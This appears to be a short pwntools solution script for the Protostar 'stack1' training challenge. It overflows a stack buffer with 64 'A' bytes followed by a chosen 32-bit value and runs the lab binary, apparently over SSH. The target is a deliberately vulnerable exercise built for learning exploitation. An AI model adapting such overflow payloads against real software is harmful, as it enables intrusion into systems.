#!/usr/bin/python
from pwn import *
from ssh import *

binarypath='/opt/protostar/bin/stack1'
payload="A"*64+p32(0x61626364)
p=sh.run([binarypath,payload])
print p.recvall()